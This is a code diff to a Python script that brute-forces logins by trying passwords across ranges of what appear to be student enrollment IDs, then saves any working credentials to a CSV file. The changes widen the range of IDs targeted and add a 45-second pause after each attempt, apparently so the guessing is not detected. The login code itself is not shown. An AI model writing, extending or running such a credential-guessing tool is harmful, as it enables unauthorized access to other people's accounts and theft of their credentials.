@@ -1,6 +1,7 @@
 import pandas as pd
 import os
 import dotenv
+import time
 
 dotenv.load_dotenv()
 expoit_id = os.getenv("EXPLOIT_ID")
@@ -41,7 +42,7 @@ def main():
     wrong_attempts = 0
     found_credentials_list = [] 
 
-    ids_to_try = [enroll for enroll in range(22102001, 22102241)] # + [enroll for enroll in range(22103001, 22103344)]
+    ids_to_try = [enroll for enroll in range(21102001, 22102184)] # + [enroll for enroll in range(21103001, 21103344)]
 
     try: 
         for user_id_to_try in ids_to_try:
@@ -87,6 +88,9 @@ def main():
                 except Exception as e_login_attempt:
                     print(f"Error during login attempt for User ID: {user_id_str}, Password: {password_attempt}: {e_login_attempt}")
                     wrong_attempts += 1
+
+                print("Pausing for 45 seconds after login attempt...")
+                time.sleep(45)
         
         print("Finished all attempts for all specified User IDs.")
 
@@ -96,7 +100,7 @@ def main():
         if found_credentials_list:
             print(f"\nAttempting to save {len(found_credentials_list)} found credentials to {csv_file_path}...")
             try:
-                df = pd.DataFrame(found_credentials_list)
+                df = pd.DataFrame(found_credentials_list) 
                 file_exists = os.path.exists(csv_file_path)
                 write_header = not file_exists or (file_exists and os.path.getsize(csv_file_path) == 0)
                 
